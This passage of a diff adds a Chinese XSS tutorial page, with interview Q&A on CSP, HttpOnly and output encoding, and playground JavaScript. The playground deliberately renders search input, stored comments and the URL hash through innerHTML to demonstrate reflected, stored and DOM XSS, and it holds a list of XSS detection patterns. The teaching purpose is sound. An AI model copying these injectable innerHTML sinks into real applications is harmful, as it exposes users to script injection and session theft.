+                                                <li><strong>上下文依赖：</strong>
+                                                    同一份输入数据可能在不同地方以不同方式输出（HTML内容、JS变量等），输入验证无法处理这种多样性，而输出编码可以根据具体上下文进行处理。
+                                                </li>
+                                            </ul>
+                                        </li>
+                                        <li><strong>关系：</strong> 两者是互补的，输入验证是第一道防线，输出编码是最后也是最关键的保障。HTML净化是处理富文本场景的必要补充。
+                                        </li>
+                                    </ul>
+                                </div>
+                            </details>
+                            <details>
+                                <summary>5. 什么是内容安全策略（CSP）？它如何帮助防御XSS？</summary>
+                                <div class="details-content">
+                                    <p><strong>考察点：</strong> 对CSP概念、作用机制和主要指令的了解。</p>
+                                    <p><strong>回答思路：</strong></p>
+                                    <ul class="list-disc list-inside pl-4 space-y-1 mt-2">
+                                        <li><strong>定义：</strong> CSP是一种通过HTTP响应头配置的安全层，用于限制浏览器可以加载和执行哪些资源。</li>
+                                        <li><strong>作用机制：</strong> 浏览器根据CSP策略决定是否加载或执行脚本、样式、图片等。</li>
+                                        <li><strong>如何防御XSS：</strong>
+                                            <ul class="list-circle list-inside ml-4 mt-1">
+                                                <li><strong>限制脚本来源 (<code>script-src</code>)：</strong>
+                                                    可以禁止加载非受信域的脚本，禁止内联脚本和 <code>eval</code>，从而阻止大部分XSS payload的执行。</li>
+                                                <li><strong>限制连接目标 (<code>connect-src</code>)：</strong>
+                                                    可以阻止恶意脚本将窃取的数据发送到攻击者的服务器。</li>
+                                                <li><strong>报告违规 (<code>report-uri</code> /
+                                                        <code>report-to</code>)：</strong> 可以将违反策略的尝试报告给开发者，帮助发现潜在攻击。
+                                                </li>
+                                            </ul>
+                                        </li>
+                                        <li><strong>举例：</strong> 可以简单说一下 <code>default-src 'self'</code>,
+                                            <code>script-src 'self' https://trusted.com</code> 等指令的作用。</li>
+                                        <li><strong>优点：</strong> 强大的补充防御，即使存在XSS漏洞，也能大大降低危害。</li>
+                                        <li><strong>挑战：</strong> 配置可能比较复杂，需要仔细测试避免影响正常功能。</li>
+                                    </ul>
+                                </div>
+                            </details>
+                            <details>
+                                <summary>6. 什么是HttpOnly Cookie？它和XSS防御有什么关系？</summary>
+                                <div class="details-content">
+                                    <p><strong>考察点：</strong> 对HttpOnly属性作用和意义的理解。</p>
+                                    <p><strong>回答思路：</strong></p>
+                                    <ul class="list-disc list-inside pl-4 space-y-1 mt-2">
+                                        <li><strong>定义：</strong> <code>HttpOnly</code> 是设置在Cookie上的一个标志。</li>
+                                        <li><strong>作用：</strong> 禁止客户端JavaScript通过 <code>document.cookie</code>
+                                            API访问带有此标志的Cookie。</li>
+                                        <li><strong>与XSS的关系：</strong> 它 <strong>不能阻止</strong> XSS漏洞本身，但能有效
+                                            <strong>缓解</strong> XSS攻击的主要危害之一——
+                                            <strong>会话劫持</strong>。因为即使攻击者注入了脚本，也无法读取到关键的会话Cookie，从而难以冒充用户身份。</li>
+                                        <li><strong>建议：</strong> 对于不需要被JS访问的敏感Cookie（尤其是Session ID），都应该设置
+                                            <code>HttpOnly</code> 属性。</li>
+                                    </ul>
+                                </div>
+                            </details>
+                            <details>
+                                <summary>7. 如果你发现一个输入框的内容被直接显示在页面上，你会怎么做来确保安全？（场景题）</summary>
+                                <div class="details-content">
+                                    <p><strong>考察点：</strong> 实际问题解决能力，能否将理论知识应用到实践中。</p>
+                                    <p><strong>回答思路：</strong></p>
+                                    <ul class="list-disc list-inside pl-4 space-y-1 mt-2">
+                                        <li><strong>识别风险：</strong> 首先指出这是一个潜在的XSS风险点，因为用户输入未经处理就输出。</li>
+                                        <li><strong>核心措施：</strong> 强调必须对这个输出进行 <strong>HTML实体编码</strong>。</li>
+                                        <li><strong>具体实现：</strong>
+                                            <ul class="list-circle list-inside ml-4 mt-1">
+                                                <li><strong>后端：</strong> 如果是后端渲染（如PHP, Java,
+                                                    Python模板），在将数据显示到模板变量之前，调用相应的HTML编码函数（如PHP的
+                                                    <code>htmlspecialchars()</code>, Python Flask/Jinja2默认自动编码）。</li>
+                                                <li><strong>前端（JS渲染）：</strong> 如果是JavaScript动态插入内容到DOM，避免使用
+                                                    <code>innerHTML</code>。优先使用 <code>textContent</code> 或
+                                                    <code>innerText</code> 来设置文本内容。如果必须使用
+                                                    <code>innerHTML</code>（例如需要渲染少量安全的HTML），则需要对输入进行严格的净化（Sanitization），可以使用像
+                                                    DOMPurify 这样的库。</li>
+                                            </ul>
+                                        </li>
+                                        <li><strong>补充措施：</strong> 也可以考虑在输入端进行一些基本的验证（如长度限制），并确保应用部署了合适的CSP策略。</li>
+                                    </ul>
+                                </div>
+                            </details>
+                            <details>
+                                <summary>8. 你在项目中用过哪些工具或框架来帮助防御XSS？</summary>
+                                <div class="details-content">
+                                    <p><strong>考察点：</strong> 实践经验，对常用技术栈中安全特性的了解。</p>
+                                    <p><strong>回答思路：</strong></p>
+                                    <ul class="list-disc list-inside pl-4 space-y-1 mt-2">
+                                        <li><strong>诚实回答：</strong> 根据你的实际经验回答。</li>
+                                        <li><strong>前端框架：</strong>
+                                            如果用过React/Vue/Angular，可以提到它们的JSX/模板引擎默认会进行HTML编码，以及需要注意
+                                            <code>dangerouslySetInnerHTML</code> / <code>v-html</code> 的风险。</li>
+                                        <li><strong>后端框架/模板引擎：</strong> 如果用过Django/Rails/Spring MVC/Express +
+                                            EJS/Jinja2等，可以提到它们通常也提供自动编码或编码函数，特别是上下文感知编码。</li>
+                                        <li><strong>库：</strong>
+                                            如果用过富文本编辑器，可以提到它们通常内置了HTML过滤/净化机制。如果处理过需要允许HTML输入的场景，可以提一下是否用过DOMPurify等净化库。
+                                        </li>
+                                        <li><strong>没有直接经验：</strong>
+                                            如果确实没怎么接触过，可以说了解这些框架通常有内置防护，但自己还在学习具体细节，并强调理解输出编码的重要性。</li>
+                                    </ul>
+                                </div>
+                            </details>
+                            <details>
+                                <summary>9. DOM型 XSS 和反射型/存储型 XSS 的主要区别是什么？为什么 DOM 型 XSS 更难检测？</summary>
+                                <div class="details-content">
+                                    <p><strong>考察点：</strong> 对 DOM 型 XSS 特殊性的理解。</p>
+                                    <p><strong>回答思路：</strong></p>
+                                    <ul class="list-disc list-inside pl-4 space-y-1 mt-2">
+                                        <li><strong>主要区别：</strong>
+                                            <ul class="list-circle list-inside ml-4 mt-1">
+                                                <li><strong>漏洞位置：</strong> 反射型和存储型的漏洞通常发生在 <strong>服务器端</strong>
+                                                    代码（未能正确处理输入和输出）。DOM 型的漏洞发生在 <strong>客户端</strong> JavaScript 代码中。
+                                                </li>
+                                                <li><strong>服务器参与：</strong> 反射型和存储型中，服务器端代码直接或间接地将恶意脚本输出到页面。DOM
+                                                    型中，服务器可能只提供包含漏洞JS代码的页面，恶意数据的处理和DOM修改完全在 <strong>浏览器端</strong>
+                                                    完成，服务器可能不感知攻击载荷（尤其是当载荷在 URL hash 中时）。</li>
+                                            </ul>
+                                        </li>
+                                        <li><strong>为什么更难检测：</strong>
+                                            <ul class="list-circle list-inside ml-4 mt-1">
+                                                <li><strong>服务器端日志：</strong>
+                                                    对于反射型（URL参数）和存储型，恶意输入通常会经过服务器，可能被记录在服务器日志中。DOM 型（尤其是基于 hash
+                                                    的）的攻击载荷通常不发送到服务器，服务器日志无法记录。</li>
+                                                <li><strong>WAF/扫描器：</strong> 传统的 Web 应用防火墙 (WAF) 或服务器端扫描器可能难以检测到客户端
+                                                    JavaScript 代码中的逻辑漏洞。需要专门的客户端代码扫描或动态分析工具。</li>
+                                                <li><strong>代码复杂性：</strong> 现代前端应用 JavaScript 代码量大、逻辑复杂，数据流难以追踪，增加了发现
+                                                    DOM 型 XSS 的难度。</li>
+                                            </ul>
+                                        </li>
+                                    </ul>
+                                </div>
+                            </details>
+                        </div>
+                    </section>
+
+                    <section id="xss-conclusion" class="content-card">
+                        <h2 class="head2"><span class="material-icons">flag</span> 总结与资源</h2>
+                        <p class="text-gray-700 mb-4">
+                            XSS 攻击是 Web 安全领域的基础也是核心威胁之一。作为全栈开发者，深入理解其原理、类型、危害和防御措施是必备技能。
+                        </p>
+                        <h3 class="head3">关键要点回顾：</h3>
+                        <ul class="list-disc list-inside space-y-2 text-gray-700 pl-4 mb-4">
+                            <li><strong>核心：</strong> 不信任用户输入，对输出进行上下文感知编码。</li>
+                            <li><strong>类型：</strong> 存储型、反射型、DOM型各有特点，DOM型发生在客户端。</li>
+                            <li><strong>防御：</strong> 输出编码是关键，HTML净化（DOMPurify）用于富文本，输入验证、CSP、HttpOnly、Trusted
+                                Types、安全框架是重要的纵深防御措施。</li>
+                            <li><strong>实践：</strong> 了解你所用框架的安全机制，谨慎处理动态数据和DOM操作，使用安全工具。</li>
+                        </ul>
+                        <div class="alert alert-success">
+                            <span class="material-icons">check_circle</span>
+                            <span>掌握 XSS 不仅能让你写出更安全的代码，保护用户和公司利益，也是面试中的重要加分项，体现了你的专业素养和责任心。</span>
+                        </div>
+                        <h3 class="head3" class="mt-6">推荐学习资源：</h3>
+                        <ul class="list-disc list-inside space-y-2 text-gray-700 pl-4">
+                            <li><a href="https://owasp.org/www-community/attacks/xss/" target="_blank"
+                                    rel="noopener noreferrer" class="text-blue-600 hover:underline">OWASP Cross Site
+                                    Scripting (XSS)</a> - Web安全领域的权威组织OWASP对XSS的详细介绍。</li>
+                            <li><a href="https://developer.mozilla.org/en-US/docs/Web/Security/Types_of_attacks#cross-site_scripting_xss"
+                                    target="_blank" rel="noopener noreferrer" class="text-blue-600 hover:underline">MDN
+                                    Web Docs: Cross-site scripting</a> - Mozilla开发者网络关于XSS的文档。</li>
+                            <li><a href="https://portswigger.net/web-security/cross-site-scripting" target="_blank"
+                                    rel="noopener noreferrer" class="text-blue-600 hover:underline">PortSwigger Web
+                                    Security Academy: XSS</a> - 提供免费的在线实验室，可以动手实践XSS攻击与防御。</li>
+                            <li><a href="https://github.com/cure53/DOMPurify" target="_blank" rel="noopener noreferrer"
+                                    class="text-blue-600 hover:underline">DOMPurify</a> - 一个流行的客户端HTML净化库。</li>
+                            <li><a href="https://web.dev/articles/trusted-types" target="_blank"
+                                    rel="noopener noreferrer" class="text-blue-600 hover:underline">Prevent DOM-based
+                                    cross-site scripting vulnerabilities with Trusted Types</a> - Google 关于 Trusted
+                                Types 的介绍。</li>
+                            <li><a href="https://csp-evaluator.withgoogle.com/" target="_blank"
+                                    rel="noopener noreferrer" class="text-blue-600 hover:underline">Google CSP
+                                    Evaluator</a> - 检查你的CSP策略是否有效的工具。</li>
+                        </ul>
+                    </section>
+                </section>
+            </article>
+        </main>
+    </div>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-core.min.js"></script>
+    <script
+        src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/autoloader/prism-autoloader.min.js"></script>
+
+    <script>
+        try { // Wrap entire script in try-catch for basic error trapping
+
+            // --- Global Variables & Utility Functions ---
+
+            // Stored XSS Playground State
+            let commentsUnsafe = []; // 模拟存储不安全评论 (原始输入)
+
+            /**
+             * Escapes HTML special characters to prevent XSS.
+             * @param {string | number | null | undefined} unsafe The potentially unsafe value.
+             * @returns {string} The escaped string.
+             */
+            function escapeHtml(unsafe) {
+                const str = String(unsafe ?? '');
+                return str
+                    .replace(/&/g, "&amp;")
+                    .replace(/</g, "&lt;")
+                    .replace(/>/g, "&gt;")
+                    .replace(/"/g, "&quot;")
+                    .replace(/'/g, "&#039;");
+            }
+
+            /**
+             * Wraps escaped HTML characters in a span for highlighting.
+             * @param {string} encoded The HTML-escaped string.
+             * @returns {string} String with escaped chars wrapped in spans.
+             */
+            function highlightEncodedChars(encoded) {
+                if (typeof encoded !== 'string') return '';
+                // Match escaped entities or standalone & not part of an entity
+                return encoded.replace(/(&lt;)|(&gt;)|(&quot;)|(&#039;)|(&amp;(?![a-zA-Z]+;|#[0-9]+;))/g, (match) => {
+                    return `<span class="encoded-char" title="已编码">${match}</span>`;
+                });
+            }
+
+            /**
+             * Displays an alert message within a specified playground output area.
+             * @param {string} message The message to display.
+             * @param {'info'|'success'|'warning'|'danger'} type The type of alert.
+             * @param {string} targetElementId The ID of the output element.
+             */
+            function showPlaygroundAlert(message, type = 'info', targetElementId) {
+                try {
+                    const targetElement = document.getElementById(targetElementId);
+                    if (!targetElement) {
+                        console.error(`showPlaygroundAlert: Target element '${targetElementId}' not found.`);
+                        return;
+                    }
+                    const alertSelector = `.playground-alert.alert-${type}[data-target="${targetElementId}"]`;
+
+                    // Clear previous alerts of the same type for this target
+                    const existingAlerts = Array.from(targetElement.children).filter(child => child.matches(alertSelector));
+                    existingAlerts.forEach(alert => alert.remove());
+
+                    const alertDiv = document.createElement('div');
+                    // Use classes from global.css for alerts
+                    alertDiv.className = `playground-alert alert alert-${type}`;
+                    alertDiv.dataset.target = targetElementId; // Link alert to target
+                    alertDiv.innerHTML = `
+                        <span class="material-icons">${getIconForAlertType(type)}</span>
+                        <span>${message}</span>`; // Assume message is safe HTML or plain text
+
+                    // Prepend inside the target element
+                    targetElement.insertBefore(alertDiv, targetElement.firstChild);
+                } catch (e) {
+                    console.error(`Error in showPlaygroundAlert for ${targetElementId}:`, e);
+                }
+            }
+
+            /**
+             * Clears existing playground alerts from a target element.
+             * @param {string} targetElementId The ID of the output element.
+             * @param {'info'|'success'|'warning'|'danger'|null} [specificType=null] If specified, only clears alerts of this type.
+             */
+            function clearPlaygroundAlerts(targetElementId, specificType = null) {
+                try {
+                    const targetElement = document.getElementById(targetElementId);
+                    if (!targetElement) return;
+
+                    const selector = `.playground-alert[data-target="${targetElementId}"]${specificType ? `.alert-${specificType}` : ''}`;
+                    const existingAlerts = Array.from(targetElement.children).filter(child => child.matches(selector));
+                    existingAlerts.forEach(alert => alert.remove());
+                } catch (e) {
+                    console.error(`Error in clearPlaygroundAlerts for ${targetElementId}:`, e);
+                }
+            }
+
+            /**
+             * Gets the appropriate Material Icon name for an alert type.
+             * @param {'info'|'success'|'warning'|'danger'} type Alert type.
+             * @returns {string} Material Icon name.
+             */
+            function getIconForAlertType(type) {
+                switch (type) {
+                    case 'danger': return 'error';
+                    case 'warning': return 'warning';
+                    case 'success': return 'check_circle';
+                    case 'info':
+                    default: return 'info';
+                }
+            }
+
+            /**
+             * Provides real-time feedback below an input field based on potentially dangerous patterns.
+             * @param {string} inputId The ID of the input/textarea element.
+             * @param {string} feedbackId The ID of the element to display feedback in.
+             */
+            function checkInput(inputId, feedbackId) {
+                try {
+                    const inputElement = document.getElementById(inputId);
+                    const feedbackElement = document.getElementById(feedbackId);
+                    if (!inputElement || !feedbackElement) return;
+
+                    const value = inputElement.value;
+                    const lowerValue = value.toLowerCase();
+                    let feedbackMsg = '';
+
+                    // Basic checks for common XSS patterns
+                    if (lowerValue.includes('<script')) {
+                        feedbackMsg = '检测到 <code>&lt;script&gt;</code> 标签！';
+                    } else if (lowerValue.includes('onerror=')) {
+                        feedbackMsg = '检测到 <code>onerror=</code> 事件处理器！';
+                    } else if (lowerValue.includes('onload=')) {
+                        feedbackMsg = '检测到 <code>onload=</code> 事件处理器！';
+                    } else if (lowerValue.includes('javascript:')) {
+                        feedbackMsg = '检测到 <code>javascript:</code> 伪协议！';
+                    } else if (/<iframe/i.test(value)) { // Check for iframe specifically
+                        feedbackMsg = '检测到 <code>&lt;iframe&gt;</code> 标签！';
+                    } else if (/<[^>]+on[a-z]+=/.test(lowerValue)) { // Generic on* event handlers
+                        feedbackMsg = '检测到潜在的事件处理器 (<code>on...=</code>)！';
+                    } else if (/<[^>]+>/g.test(value)) { // Any HTML tag
+                        feedbackMsg = '检测到 HTML 标签 (<code>&lt;...&gt;</code>)！';
+                    } else if (value.includes('<') || value.includes('>')) {
+                        feedbackMsg = '检测到 HTML 特殊字符 (<code>&lt;</code> 或 <code>&gt;</code>)！';
+                    }
+
+                    feedbackElement.innerHTML = feedbackMsg; // Safe as we construct the HTML
+                } catch (e) {
+                    console.error(`Error in checkInput for ${inputId}:`, e);
+                }
+            }
+
+            // --- Manual Data Setup ---
+
+            /** Sets manually entered data into cookie and localStorage */
+            function setManualData() {
+                try {
+                    const cookieInput = document.getElementById('manual-cookie');
+                    const lsInput = document.getElementById('manual-localstorage');
+                    if (!cookieInput || !lsInput) throw new Error("Manual data input elements not found.");
+
+                    const cookieValue = cookieInput.value.trim();
+                    const lsValue = lsInput.value.trim();
+
+                    // Set Cookie (ensure it's not HttpOnly for demo purposes)
+                    const encodedCookieValue = encodeURIComponent(cookieValue);
+                    if (cookieValue) {
+                        // Setting Max-Age makes it persistent for the duration
+                        document.cookie = `manualSessionId=${encodedCookieValue}; path=/; SameSite=Lax; Max-Age=3600`;
+                    } else {
+                        // Delete the cookie
+                        document.cookie = "manualSessionId=; path=/; SameSite=Lax; expires=Thu, 01 Jan 1970 00:00:00 GMT";
+                    }
+
+                    // Set LocalStorage
+                    if (lsValue) {
+                        localStorage.setItem('userInfo', lsValue);
+                    } else {
+                        localStorage.removeItem('userInfo');
+                    }
+
+                    updateDataDisplay();
+
+                    // Provide visual feedback on the button
+                    const setDataButton = document.querySelector('#playground-setup button');
+                    if (setDataButton) {
+                        const originalText = setDataButton.textContent;
+                        setDataButton.textContent = '数据已设置!';
+                        setDataButton.disabled = true;
+                        setTimeout(() => {
+                            setDataButton.textContent = originalText;
+                            setDataButton.disabled = false;
+                        }, 1500);
+                    }
+                } catch (e) {
+                    console.error("Error in setManualData:", e);
+                    alert("设置数据时出错: " + e.message);
+                }
+            }
+
+            /** Safely displays the current manual data */
+            function updateDataDisplay() {
+                try {
+                    const cookieDisplay = document.getElementById('display-cookie');
+                    const lsDisplay = document.getElementById('display-localstorage');
+                    if (!cookieDisplay || !lsDisplay) throw new Error("Data display elements not found.");
+
+                    // Parse Cookie
+                    let manualCookieValue = '(未设置)';
+                    const cookies = document.cookie ? document.cookie.split('; ') : [];
+                    for (const cookie of cookies) {
+                        const parts = cookie.split('=', 2);
+                        if (parts[0].trim() === 'manualSessionId' && parts.length > 1) {
+                            try {
+                                manualCookieValue = decodeURIComponent(parts[1] || '');
+                            } catch { manualCookieValue = '(解码错误)'; }
+                            break;
+                        }
+                    }
+                    cookieDisplay.textContent = manualCookieValue || '(值为空)';
+
+                    // Display localStorage
+                    lsDisplay.textContent = localStorage.getItem('userInfo') || '(未设置)';
+
+                } catch (e) {
+                    console.error("Error in updateDataDisplay:", e);
+                    const cookieDisplay = document.getElementById('display-cookie');
+                    const lsDisplay = document.getElementById('display-localstorage');
+                    if (cookieDisplay) cookieDisplay.textContent = '(读取错误)';
+                    if (lsDisplay) lsDisplay.textContent = '(读取错误)';
+                }
+            }
+
+
+            // --- Playground Simulation Functions (No Iframes) ---
+
+            /** Reflected XSS Playground Simulation */
+            function simulateSearch() {
+                try {
+                    const inputElement = document.getElementById('reflected-input');
+                    const unsafeOutput = document.getElementById('reflected-output-unsafe');
+                    const safeOutput = document.getElementById('reflected-output-safe');
+                    if (!inputElement || !unsafeOutput || !safeOutput) {
+                        throw new Error("Required playground elements not found for Reflected XSS.");
+                    }
+
+                    const userInput = inputElement.value;
+
+                    // Clear previous results and alerts
+                    clearPlaygroundAlerts('reflected-output-safe');
+                    clearPlaygroundAlerts('reflected-output-unsafe');
+                    safeOutput.innerHTML = '';
+                    unsafeOutput.innerHTML = ''; // Clear unsafe area too
+
+                    // --- Unsafe Output (Direct innerHTML) ---
+                    // THIS IS THE REFLECTED XSS SIMULATION
+                    // Wrap the user input in a simple structure for context
+                    const unsafeWrapper = document.createElement('div');
+                    unsafeWrapper.innerHTML = `<p>您搜索了： ${userInput}</p>`; // Direct injection
+                    unsafeOutput.appendChild(unsafeWrapper);
+                    unsafeOutput.appendChild(document.createElement('hr'));
+                    const unsafeNote = document.createElement('p');
+                    unsafeNote.innerHTML = `<small><em>(此内容直接使用innerHTML插入，脚本会执行)</em></small>`;
+                    unsafeOutput.appendChild(unsafeNote);
+
+                    // Add a warning specifically to the unsafe area
+                    showPlaygroundAlert(`内容已使用 <code>innerHTML</code> 插入。如果包含可执行脚本，它将在您的浏览器中运行！`, 'warning', 'reflected-output-unsafe');
+
+
+                    // --- Safe Output (HTML Escaped) ---
+                    const safeResultPara = document.createElement('p');
+                    const encodedInput = highlightEncodedChars(escapeHtml(userInput));
+                    safeResultPara.innerHTML = `您搜索了： ${encodedInput}`; // Safe to use innerHTML with escaped+highlighted content
+                    safeOutput.appendChild(safeResultPara);
+                    showPlaygroundAlert(`特殊字符已被HTML实体编码 (高亮显示)，脚本不会执行。`, 'success', 'reflected-output-safe');
+
+                } catch (e) {
+                    console.error("Error in simulateSearch:", e);
+                    alert("运行反射型 Playground 时出错: " + e.message);
+                    const safeOutput = document.getElementById('reflected-output-safe');
+                    if (safeOutput) {
+                        showPlaygroundAlert(`运行反射型 Playground 时出错: ${escapeHtml(e.message)}`, 'danger', 'reflected-output-safe');
+                    }
+                    const unsafeOutput = document.getElementById('reflected-output-unsafe');
+                    if (unsafeOutput) {
+                        showPlaygroundAlert(`运行反射型 Playground 时出错: ${escapeHtml(e.message)}`, 'danger', 'reflected-output-unsafe');
+                    }
+                }
+            }
+
+            /** Stored XSS Playground: Add Comment Simulation */
+            function simulateComment() {
+                try {
+                    const inputElement = document.getElementById('stored-input');
+                    if (!inputElement) throw new Error("Element 'stored-input' not found.");
+
+                    const commentText = inputElement.value;
+                    if (!commentText.trim()) {
+                        showPlaygroundAlert(`评论内容不能为空。`, 'warning', 'stored-output-safe');
+                        return;
+                    }
+
+                    // Simulate storing the raw (unsafe) comment
+                    commentsUnsafe.push(commentText);
+                    // Persist to localStorage to simulate database storage across refreshes (optional)
+                    try {
+                        localStorage.setItem('xssDemoComments', JSON.stringify(commentsUnsafe));
+                    } catch (lsError) {
+                        console.warn("Could not save comments to localStorage:", lsError);
+                        showPlaygroundAlert(`无法将评论保存到LocalStorage (可能已满或禁用)。评论将在刷新后丢失。`, 'warning', 'stored-output-safe');
+                    }
+
+                    renderStoredComments(); // Re-render both safe and unsafe areas
+
+                    inputElement.value = ''; // Clear input
+                    const feedbackElement = document.getElementById('stored-feedback');
+                    if (feedbackElement) feedbackElement.innerHTML = ''; // Clear feedback
+
+                    // Clear previous success messages before showing new one
+                    clearPlaygroundAlerts('stored-output-safe', 'success');
+                    clearPlaygroundAlerts('stored-output-unsafe', 'success');
+                    showPlaygroundAlert(`评论已添加。"安全列表"显示编码后内容，"不安全列表"直接渲染原始内容。`, 'success', 'stored-output-safe');
+
+                } catch (e) {
+                    console.error("Error in simulateComment:", e);
+                    alert("添加评论时出错: " + e.message);
+                    const safeOutput = document.getElementById('stored-output-safe');
+                    if (safeOutput) {
+                        showPlaygroundAlert(`添加评论时出错: ${escapeHtml(e.message)}`, 'danger', 'stored-output-safe');
+                    }
+                    const unsafeOutput = document.getElementById('stored-output-unsafe');
+                    if (unsafeOutput) {
+                        showPlaygroundAlert(`添加评论时出错: ${escapeHtml(e.message)}`, 'danger', 'stored-output-unsafe');
+                    }
+                }
+            }
+
+            /** Stored XSS Playground: Render Comment Lists (Safe Div & Unsafe Div) */
+            function renderStoredComments() {
+                try {
+                    const unsafeOutput = document.getElementById('stored-output-unsafe');
+                    const safeOutput = document.getElementById('stored-output-safe');
+                    if (!unsafeOutput || !safeOutput) {
+                        throw new Error("Required playground elements not found for Stored XSS.");
+                    }
+
+                    // --- Render Unsafe Comments into Div using innerHTML ---
+                    // Clear previous unsafe comments, but keep alerts
+                    const existingUnsafeAlerts = unsafeOutput.querySelectorAll(':scope > .playground-alert');
+                    unsafeOutput.innerHTML = ''; // Clear content
+                    existingUnsafeAlerts.forEach(alert => unsafeOutput.appendChild(alert)); // Restore alerts
+
+                    let unsafeHtmlContent = '';
+                    if (commentsUnsafe.length === 0) {
+                        unsafeHtmlContent = '<div><em>(暂无评论)</em></div>';
+                    } else {
+                        commentsUnsafe.forEach((comment, index) => {
+                            // THIS IS THE STORED XSS SIMULATION
+                            // Wrap each comment for better structure, still inject raw comment
+                            unsafeHtmlContent += `<div class="p-2 border-b border-red-100">评论 #${index + 1}: ${comment}</div>`; // Direct injection
+                        });
+                    }
+                    // Append the comments and the note
+                    const commentsContainer = document.createElement('div');
+                    commentsContainer.innerHTML = unsafeHtmlContent;
+                    unsafeOutput.appendChild(commentsContainer);
+
+                    const unsafeNote = document.createElement('p');
+                    unsafeNote.innerHTML = `<hr class="my-2 border-red-200"><small><em>(此内容直接使用innerHTML渲染，脚本会执行)</em></small>`;
+                    unsafeOutput.appendChild(unsafeNote);
+
+                    // Add a warning specifically to the unsafe area if not already present
+                    if (!unsafeOutput.querySelector('.alert-warning')) {
+                        showPlaygroundAlert(`"不安全列表"直接渲染原始内容，脚本会执行！`, 'warning', 'stored-output-unsafe');
+                    }
+
+
+                    // --- Render Safe Comments into Div (Escaped) ---
+                    const existingSafeAlerts = safeOutput.querySelectorAll(':scope > .playground-alert');
+                    safeOutput.innerHTML = ''; // Clear previous safe comments
+                    existingSafeAlerts.forEach(alert => safeOutput.appendChild(alert)); // Restore alerts
+
+                    if (commentsUnsafe.length === 0) {
+                        const noCommentsDiv = document.createElement('div');
+                        noCommentsDiv.className = 'p-2 text-sm text-gray-500';
+                        noCommentsDiv.textContent = '(暂无评论)';
+                        safeOutput.appendChild(noCommentsDiv);
+                    } else {
+                        commentsUnsafe.forEach((comment, index) => {
+                            const div = document.createElement('div');
+                            div.className = 'p-2 border-b border-green-100 text-sm';
+                            // Escape the comment, then highlight
+                            div.innerHTML = `评论 #${index + 1}: ${highlightEncodedChars(escapeHtml(comment))}`;
+                            safeOutput.appendChild(div);
+                        });
+                    }
+                } catch (e) {
+                    console.error("Error in renderStoredComments:", e);
+                    const safeOutput = document.getElementById('stored-output-safe');
+                    if (safeOutput) {
+                        safeOutput.innerHTML = `<div class="alert alert-danger">渲染评论时出错: ${escapeHtml(e.message)}</div>`;
+                    }
+                    const unsafeOutput = document.getElementById('stored-output-unsafe');
+                    if (unsafeOutput) {
+                        unsafeOutput.innerHTML = `<div class="alert alert-danger">渲染评论时出错: ${escapeHtml(e.message)}</div>`;
+                    }
+                }
+            }
+
+            /** Stored XSS Playground: Clear Comments */
+            function clearComments() {
+                try {
+                    commentsUnsafe = []; // Clear the in-memory array
+                    // Clear the simulated storage
+                    try {
+                        localStorage.removeItem('xssDemoComments');
+                    } catch (lsError) {
+                        console.warn("Could not clear comments from localStorage:", lsError);
+                    }
+                    renderStoredComments(); // Re-render to show empty state
+                    // Clear alerts and feedback
+                    clearPlaygroundAlerts('stored-output-safe');
+                    clearPlaygroundAlerts('stored-output-unsafe');
+                    const feedbackElement = document.getElementById('stored-feedback');
+                    if (feedbackElement) feedbackElement.innerHTML = '';
+                    showPlaygroundAlert(`评论已清空。`, 'info', 'stored-output-safe');
+                } catch (e) {
+                    console.error("Error in clearComments:", e);
+                    alert("清空评论时出错: " + e.message);
+                    const safeOutput = document.getElementById('stored-output-safe');
+                    if (safeOutput) {
+                        showPlaygroundAlert(`清空评论时出错: ${escapeHtml(e.message)}`, 'danger', 'stored-output-safe');
+                    }
+                    const unsafeOutput = document.getElementById('stored-output-unsafe');
+                    if (unsafeOutput) {
+                        showPlaygroundAlert(`清空评论时出错: ${escapeHtml(e.message)}`, 'danger', 'stored-output-unsafe');
+                    }
+                }
+            }
+
+            /** DOM XSS Playground Simulation */
+            function simulateDOMUpdate() {
+                try {
+                    const unsafeOutput = document.getElementById('dom-output-unsafe');
+                    const safeOutput = document.getElementById('dom-output-safe');
+                    if (!unsafeOutput || !safeOutput) {
+                        throw new Error("Required playground elements not found for DOM XSS.");
+                    }
+
+                    // Clear previous results and alerts
+                    clearPlaygroundAlerts('dom-output-safe');
+                    clearPlaygroundAlerts('dom-output-unsafe');
+                    safeOutput.innerHTML = '';
+                    unsafeOutput.innerHTML = '';
+
+                    // --- Process Hash ---
+                    let hashValue = '';
+                    let decodingError = false;
+                    let rawHash = '';
+                    try { // Wrap hash access in try-catch for potential security restrictions
+                        rawHash = window.location.hash.substring(1);
+                    } catch (hashError) {
+                        console.error("Error accessing window.location.hash:", hashError);
+                        showPlaygroundAlert(`无法访问 URL Hash (${escapeHtml(hashError.message)})`, 'danger', 'dom-output-unsafe');
+                        showPlaygroundAlert(`无法访问 URL Hash (${escapeHtml(hashError.message)})`, 'danger', 'dom-output-safe');
+                        return;
+                    }
+
+
+                    if (rawHash) {
+                        try {
+                            // Use decodeURIComponent for standard decoding
+                            hashValue = decodeURIComponent(rawHash);
+                        } catch (e) {
+                            console.warn("Error decoding hash:", e);
+                            hashValue = rawHash; // Use raw value if decoding fails
+                            decodingError = true;
+                        }
+                    } else {
+                        hashValue = '(Hash 为空)';
+                    }
+
+                    // --- Unsafe Output (Direct innerHTML) ---
+                    // THIS IS THE DOM XSS SIMULATION
+                    let unsafeContent = `来自URL Hash的内容： ${hashValue}`;
+                    if (decodingError) {
+                        unsafeContent += ` <span class="text-orange-600">(解码错误，显示原始值)</span>`;
+                    }
+                    // Wrap in a div to ensure content is appended correctly
+                    const unsafeWrapper = document.createElement('div');
+                    unsafeWrapper.innerHTML = unsafeContent; // Direct injection
+                    unsafeOutput.appendChild(unsafeWrapper);
+                    unsafeOutput.appendChild(document.createElement('hr'));
+                    const unsafeNote = document.createElement('p');
+                    unsafeNote.innerHTML = `<small><em>(此内容直接使用innerHTML更新，脚本会执行)</em></small>`;
+                    unsafeOutput.appendChild(unsafeNote);
+
+                    showPlaygroundAlert(`"不安全更新"直接使用innerHTML更新，脚本会执行！`, 'warning', 'dom-output-unsafe');
+
+
+                    // --- Safe Output (Using textContent) ---
+                    const safeContentSpan = document.createElement('span');
+                    safeContentSpan.textContent = `来自URL Hash的内容： ${hashValue}`; // Use textContent for safety
+                    safeOutput.appendChild(safeContentSpan);
+
+                    if (decodingError) {
